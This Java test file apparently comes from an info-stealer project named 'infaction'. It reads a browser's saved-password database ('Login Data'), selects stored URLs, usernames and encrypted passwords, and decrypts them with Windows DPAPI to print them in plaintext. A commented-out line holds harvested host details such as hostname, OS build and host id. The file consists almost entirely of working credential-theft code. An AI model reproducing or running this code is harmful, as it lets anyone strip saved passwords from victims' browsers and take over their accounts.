
import com.jimmy.infaction.common.*;

import java.util.Arrays;
import java.util.List;
import com.sun.jna.platform.win32.Crypt32Util;

import java.nio.charset.StandardCharsets;
public class Test {
	public static void main(String[] args)   {
//		String jsonstr = "[{\"hostname\":\"RSVUBLJAANBQZT6\",\"uptime\":107492,\"bootTime\":1569191716,\"procs\":221,\"os\":\"windows\",\"platform\":\"Microsoft Windows 10 Pro\",\"platformFamily\":\"Standalone Workstation\",\"platformVersion\":\"10.0.18362 Build 18362\",\"kernelVersion\":\"\",\"kernelArch\":\"x86_64\",\"virtualizationSystem\":\"\",\"virtualizationRole\":\"\",\"hostid\":\"e5b51039-15d7-47a7-9470-adf9888dee3c\"}]";
//		JSONArray jsonArray = new JSONArray(jsonstr);
//		JSONObject jsonObj = jsonArray.getJSONObject(0);
//		System.out.println(jsonObj.getString("platform"));

		try {
			SqliteHelper h = new SqliteHelper("C:\\Users\\Administrator\\tmp\\Login Data");
			List<SqlLiteDemoResult> demoList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
			for (SqlLiteDemoResult result:demoList) {
				System.out.println(result.getAction_url());
				System.out.println(result.getUsername_value());
				System.out.println(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
			}
		}catch (Exception e){
			e.printStackTrace();
		}
	}
}
